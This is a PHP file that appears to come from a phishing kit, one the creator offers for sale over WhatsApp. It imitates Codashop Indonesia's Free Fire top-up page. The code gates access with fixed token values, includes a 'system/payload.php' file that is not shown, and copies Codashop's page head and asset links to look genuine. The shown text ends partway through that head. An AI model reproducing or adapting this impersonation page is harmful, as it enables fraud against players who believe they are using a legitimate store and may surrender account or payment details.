<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="id-ID" class=" page--ott">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><!--[if IE]><link rel="icon" href="/img/icons/favicon.ico" crossorigin="anonymous"><![endif]-->
    <link rel="icon" type="image/png" sizes="48x48" href="https://www.codashop.com/img/icons/favicon-48.png" crossorigin="anonymous">
    <link rel="icon" type="image/png" sizes="96x96" href="https://www.codashop.com/img/icons/favicon-96.png" crossorigin="anonymous">
    <title>Top Up Free Fire - Codashop Indonesia</title>
    <link href="https://www.codashop.com/assets/app.582c2253c0c66ab1e35b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/js/runtime.c76ab938.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.amazon-cognito-identity-js.9237e85c478474aba72d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-cache-inmemory.be504a334d6ffd94a755.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-cache.5802cc5cca8c137ace6c.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-client.48d6996656c927934fa8.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-link-context.611bb54f28feb1b9339c.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-link-http-common.3503a6bc16518353bb1c.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-link-http.1c0b6af9b16df3c10368.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-link.0ce2a444375656a728f1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.apollo-utilities.215acf3048558fb04a8f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.asn1.js.a04aa8345afd26eab819.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.aws-amplify.234fa3b751469a4cafc3.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.aws-crypto.e068d588e09412c8d78d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.aws-sdk.a24717fe70f31b99d889.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.axios.ca3497aeb4c35d4b960b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.base64-js.ff73d14f87262d311532.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.bn.js.95d9f99060cd30d6bd6e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.bowser.5d100c1438dc18957bbb.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.brorand.d8273230a7a7ba0343b4.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.browserify-aes.e8996148fb5eb5e0ccf6.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.browserify-cipher.6dabc5dcbcad5863683e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.browserify-des.d0a10adb4e1b609e42b7.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.browserify-rsa.649a550b87d90f07f23d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.browserify-sign.d34bd9bcd51f54ac2621.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.buffer-equal-constant-time.c9509402c244755e022e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.buffer-xor.33c35294d71d63cceab1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.buffer.4071ed6e8bed01ef1b00.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.cipher-base.c8ada6229c8391af0710.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.clipboard.8cc757a7436a129a5ac2.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.cookie-universal.a73efc67ab703516a582.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.cookie.691d5311ecea300f2eb9.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.core-js.903a86f4fb0c866f35ba.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.core-util-is.2a052749dedef27fd14e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.create-ecdh.7d25268072281d8ca6b4.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.create-hash.c4c09eb1adca17346f1b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.create-hmac.a1355ef25d6d924fd9a0.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.crypto-browserify.0803a7a828d10dc7acca.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.crypto-js.659449ef56876aee6fe6.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.deepmerge.bfa921c8916e7df392bd.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.des.js.e7ceeb62de1fc007032b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.diffie-hellman.741e7b68ed774e4696b0.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.dompurify.49260a3389be6981d7dd.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.ecdsa-sig-formatter.97e8ed3a4966f40fce56.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.elliptic.ac3a09f2d2ef47d44811.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.events.da159c6b66781b1f8c88.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.evp_bytestokey.4a9ca8563e321d89fde3.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.experiments.928eca24fb3cd09d33c1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.fast-json-stable-stringify.9fb9956ba42a48d55442.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.fast-xml-parser.49ce6935a5b554f3fc87.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.flatted.fdd7e1d245548bf4ea92.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.graphql-tag.ff7ba81e4ceb3e517173.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.graphql.93cbe4d0b551a1e88e76.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.growthbook.7f8233ba89a3c0a30b46.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.gtm-support.c21700736103afd35313.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.hash-base.6f80f658d651c8fe90ca.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.hash.js.05613bed92d762eed21b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.hmac-drbg.bc20bf71c5519a1dd9f1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.ieee754.a8a0e273e9616697ac0e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.inherits.c968e8ae8d40d3bf70a4.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.isarray.79777e3bb6b156f85bba.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.isomorphic-unfetch.f347b0f41a860f629573.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.js-cookie.fc78000be026d7f1de3c.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.jsonwebtoken.8225deb63e03f51cbdb3.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.jwa.58021745266c4c81e40d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.jws.1cdb35576fd164f4cc01.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.4c640869c6866850fd67.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.includes.e144c628a15a2d3f0fe4.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.isboolean.f22e3b1381200acbd289.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.isinteger.a4f9cb14f360f7e4f2dc.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.isnumber.6f26998256a5cf1561e1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.isplainobject.3a84959857cafe107bf4.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.isstring.849440c6420ca6477b72.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lodash.once.581b2f53fe7420134304.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.lukeed.32636b505ed308490eed.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.md5.js.5bfc75e8f461f9e335bc.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.miller-rabin.10b05e001d40d02dd013.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.minimalistic-assert.849a83e2d28b153c0dc6.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.minimalistic-crypto-utils.6510f45f5aedb8967b02.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.ms.9190ace79303cfc0e6b8.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.node-abort-controller.541799f3d499aa7cac35.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.node-fetch.ab00435915af82019b12.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.node-libs-browser.f7d44fc586406f897a4e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.optimism.7cdc15d9ec1e594fb08f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.parse-asn1.3cd418cd9c34a4726622.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.path-browserify.d40effe3e53bd1353b66.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.pbkdf2.6954b11082959a4d2240.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.process-nextick-args.f9925ca3040d5f68dc89.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.public-encrypt.90ce31658f6bb876b944.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.punycode.1e97f3b6663c48d29ba0.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.querystring-es3.617d4b41a6fcba1becfb.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.randombytes.8caf5fdb8ac09a8c063d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.randomfill.8b0c24652db8b2263eb6.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.readable-stream.af05084fc8233a9b796f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.regenerator-runtime.9e13e3b210e7b292b8d8.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.register-service-worker.dd343a3cd68f663e679b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.ripemd160.a3e75c8724e70a8c3c8b.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.safe-buffer.133656f1429d4693696c.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.safer-buffer.3250d46f88e5c39b14de.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.sentry.b3c61292f28f18f85deb.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.sha.js.810b297bdf0b246ebd14.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.stream-browserify.3f16327245801acca98f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.string_decoder.2231fb690fe04551867d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.strnum.63ecd5c572ebfdcfed4e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.symbol-observable.168e8cdfd14361652353.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.tiny-cookie.cb3840c78854f7e7def1.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.ts-invariant.828210a6fcc568b75a25.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.tslib.d79777dfb3df70e283bf.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.unfetch.29873a550ff7520304af.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.universal-cookie.81141ed1fc32104f1f4d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.url.b53bd76f956b92cea0ae.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.util-deprecate.01ec85a53a16dc6f36cd.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.util.fe1011281028eb7018aa.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.uuid.441f5e72be634a6cf345.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-apollo.2cd24cc0a97716d81b21.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-axios.24f74873d9e7eaf924ae.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-clipboard2.408b1e05c6fde3935c47.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-cookie.f49b7954ceecc1baeb5f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-head.656273860e7ac4cad82e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-i18n.2298792bdc5fa1685e33.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-loader.122194bbbec794da6f73.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-meta.291946be1a5e5c89944f.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-plugin-load-script.92fd09e4c520eaef4b6e.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue-router.5c25d1c8d46f5276b6e2.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vue.0fc0855c556e5859958d.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vuex-persist.5f913d281630fa4ef486.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.vuex.f0e82ced051cc1ac9cc5.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.webpack.e64a58870b0645d66c63.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.wry.8287990cefd04ffb4376.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/npm.zen-observable.d0a95d20a40a24058ad5.95616.js" rel="preload" as="script" crossorigin="anonymous">
    <link href="https://www.codashop.com/assets/app.95593.css" rel="stylesheet" crossorigin="anonymous">
    <link rel="icon" type="image/png" sizes="32x32" href="/img/icons/favicon-32.png?v=2" crossorigin="anonymous">
    <link rel="icon" type="image/png" sizes="16x16" href="/img/icons/favicon-16.png?v=2" crossorigin="anonymous">
    <link rel="manifest" href="/manifest.json" crossorigin="anonymous">
    <meta name="theme-color" content="#280031">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="Codashop">
    <link rel="apple-touch-icon" href="/img/icons/apple-touch-icon-192.png?v=2" crossorigin="anonymous">
    <link rel="mask-icon" href="/img/icons/safari-pinned-tab.svg" color="#280031" crossorigin="anonymous">
    <meta name="msapplication-TileImage" content="/img/icons/ms-tile-icon-142.png?v=2">
    <meta name="msapplication-TileColor" content="#280031">
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/cashback~footer~homePage~inviteRefer~leftPanel~rewardsAndWallet~unverifiedPhoneModal~welcomeModal.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/cashback~footer~homePage~inviteRefer~leftPanel~rewardsAndWallet~unverifiedPhoneModal~welcomeModal.a04d997106d7a4132a13.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/cashback~footer~homePage~notifications~rewardsAndWallet~search~unverifiedPhoneModal.3e2cfc7bc5e8d7cd1cc4.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/footer.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/footer.cc760f6edc22df66231c.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/toast.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/toast.d8d8fada53e0920e2656.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/hamburger.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/hamburger.f7e232b3ffc336b49698.95616.js" defer=""></script>
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/npm.vee-validate.41b5ce73ee3af54612ea.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/npm.lodash.debounce.42953abb6948059de93c.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/button.1a55a13b4e3235843a94.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/ReferralShareLink~Unsubscribe~UserPromoReferral~communityProfile~home~international~modal~orderCompl~52090496.e74adfab5c3c8587bf37.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/modal.27ec11ce771437c0db87.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/international.fb68b4ee98f5d56424a5.95616.js">
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/button.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/button.1a55a13b4e3235843a94.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/OTPModal~antiDcbModal~cashTopUpModals~notifications~redeem-success-modal~referralRestrictedModal~rew~dd856ae2.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/OTPModal~antiDcbModal~cashTopUpModals~notifications~redeem-success-modal~referralRestrictedModal~rew~dd856ae2.071d6fe853640742ebf4.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/codacashLandingPage~leftPanel~notifications~unverifiedPhoneModal~welcomeModal.bf6aa89849d797608313.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/notifications.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/notifications.682b5040617fa3861849.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/lang-id-ID-json.ee1d40a71a3b12be3a20.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/npm.vee-validate.41b5ce73ee3af54612ea.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/npm.lodash.debounce.42953abb6948059de93c.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/ReferralShareLink~Unsubscribe~UserPromoReferral~communityProfile~home~international~modal~orderCompl~52090496.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/ReferralShareLink~Unsubscribe~UserPromoReferral~communityProfile~home~international~modal~orderCompl~52090496.e74adfab5c3c8587bf37.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/productDetail.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/productDetail.248784dcaa89cc4efee9.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/leftPanel.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/leftPanel.0abd87cd3704f07db6be.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/themeSupport.48dd7bcbc4fb9929b773.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/spinner.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/spinner.686f68a312b3f715d966.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/cashTopUpModals~cashback~challenges~codacashLandingPage~rewardsAndWallet~search~transactionHistory~u~9f8cadf4.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/cashTopUpModals~cashback~challenges~codacashLandingPage~rewardsAndWallet~search~transactionHistory~u~9f8cadf4.5d59185d4edfab0ad5ad.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/search.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/search.d2ef7cea4f3b5b3f0be7.95616.js" defer=""></script>
    <link data-vue-meta="1" rel="canonical" id="canonical" href="https://www.codashop.com/id-id/free-fire">
    <meta data-vue-meta="1" name="description" content="Beli kredit permainan, aplikasi atau voucher online menggunakan pilihan pembayaran paling mudah di Indonesia. Terkirim langsung &amp; terpercaya." id="desc">
    <meta data-vue-meta="1" name="application-name" content="Codashop" id="application-name">
    <meta data-vue-meta="1" name="og:site_name" content="Codashop Indonesia" id="site-name">
    <meta data-vue-meta="1" property="og:title" content="Loading Product - Codashop" id="title">
    <meta data-vue-meta="1" property="og:description" content="Beli kredit permainan, aplikasi atau voucher online menggunakan pilihan pembayaran paling mudah di Indonesia. Terkirim langsung &amp; terpercaya." id="desc">
    <meta data-vue-meta="1" property="og:url" content="https://www.codashop.com/id-id/free-fire" id="url">
    <meta data-vue-meta="1" property="og:type" content="website" id="type">
    <meta data-vue-meta="1" property="og:image" content="https://cdn1.codashop.com/S/content/common/images/rebrand/og-image.png" id="image">
    <meta data-vue-meta="1" property="og:image:width" content="1200" id="image-width">
    <meta data-vue-meta="1" property="og:image:height" content="630" id="image-height">
    <meta data-vue-meta="1" property="og:locale" content="id-ID" id="locale">
    <meta data-vue-meta="1" property="twitter:card" content="summary_large_image" id="twitter-card">
    <meta data-vue-meta="1" property="twitter:title" content="Loading Product - Codashop" id="twitter-title">
    <meta data-vue-meta="1" property="twitter:description" content="Beli kredit permainan, aplikasi atau voucher online menggunakan pilihan pembayaran paling mudah di Indonesia. Terkirim langsung &amp; terpercaya." id="twitter-description">
    <meta data-vue-meta="1" property="twitter:image" content="https://cdn1.codashop.com/S/content/common/images/rebrand/og-image.png" id="twitter-image">
    <script charset="utf-8" src="https://www.codashop.com/assets/modal.27ec11ce771437c0db87.95616.js" defer=""></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/icon-sad-face.b06f6ddcde661978dd17.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/geoSentryModal~pageNotFound.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/geoSentryModal~pageNotFound.b53df565d7001733c2a5.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/error.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/error.850de127a78ca9b770d5.95616.js" defer=""></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/pageNotFound.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/pageNotFound.dc053bf1a7f76abb8687.95616.js" defer=""></script>
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/modal.27ec11ce771437c0db87.95616.js">
    <link rel="prefetch" as="script" href="https://www.codashop.com/assets/international.fb68b4ee98f5d56424a5.95616.js">
    <meta data-vue-meta="ssr" name="application-name" content="Codashop" id="application-name">
    <meta data-vue-meta="ssr" name="og:site_name" content="Codashop Indonesia" id="site-name">
    <meta data-vue-meta="ssr" property="og:url" content="https://www.codashop.com/id-id/free-fire" id="url">
    <meta data-vue-meta="ssr" property="og:type" content="website" id="type">
    <meta data-vue-meta="ssr" property="og:image:width" content="1200" id="image-width">
    <meta data-vue-meta="ssr" property="og:image:height" content="630" id="image-height">
    <meta data-vue-meta="ssr" property="og:locale" content="id-ID" id="locale">
    <meta data-vue-meta="ssr" property="twitter:card" content="summary_large_image" id="twitter-card">
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/rewardsAndWallet.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/rewardsAndWallet.2d6f05bd022a6a9d4e47.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/npm.mathieustan.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/npm.mathieustan.f5fde794f5d858975b7a.95616.js"></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/npm.body-scroll-lock.230424a26dcebceaa13d.95616.js"></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/npm.dayjs.2dd5d695ce6e50c10ceb.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/productBuy.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/productBuy.5f32f6964e032b48be32.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/product.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/product.1a8748fbeeef193c99b1.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/longDesc.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/longDesc.3339c33b214aa71a0099.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/productFAQ.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/productFAQ.d88e567547ab53ed6d6a.95616.js"></script>
    <script charset="utf-8" src="https://www.codashop.com/assets/TrustInformation~TrustInformationExperiment.0de058431d50c02a7bd3.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/TrustInformation.95593.css">
    <script charset="utf-8" src="https://www.codashop.com/assets/TrustInformation.f1b840952afc29cac0fd.95616.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.codashop.com/assets/badge.95593.css">
